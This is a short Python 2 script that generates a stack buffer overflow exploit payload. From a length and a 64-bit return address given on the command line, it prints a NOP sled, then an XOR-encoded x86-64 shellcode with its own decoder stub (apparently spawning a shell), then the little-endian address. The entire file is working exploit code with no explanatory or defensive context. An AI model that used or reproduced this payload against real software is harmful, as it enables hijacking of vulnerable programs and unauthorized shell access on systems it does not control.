import sys

if __name__ == "__main__":
    if (len(sys.argv) != 3):
        print "Usage: " + sys.argv[0] + " length address"
        exit(-1)

    try:
        length = int(sys.argv[1])
    except:
        print "Length should be a number"
        exit(-1)
    if length <= 0:
        print "Length should be a povitive number"
        exit(-1)

    address = sys.argv[2]
    if address[:2] != "0x":
        print "Address should be in hex format"
        exit(-1)
    address = address[2:]
    if len(address) != 16:
        print "Address should be 64 bits"
        exit(-1)
    try:
        address = [chr(int(address[2*i:2*i+2], 16)) for i in range(8)]
        address.reverse()
        address = "".join(address)
    except:
        print "Address is not invalid hex"
        exit(-1)

    shellcode = "\xeb\x27\x5b\x53\x5f\xb0\xd0\xfc\xae\x75\xfd\x57\x59\x53\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f\x92\x8b\x74\x07\x80\x3e\xd0\x75\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff\xff\x01\xd0\x49\xb9\x2e\x63\x68\x6f\x2e\x72\x69\x01\x98\x51\x55\x5e\x53\x5f\x6b\x3a\x59\x0e\x04\x92\x8b"
    nop = "\x90"

    nop_size = length - len(address) - len(shellcode)

    print nop * nop_size + shellcode + address
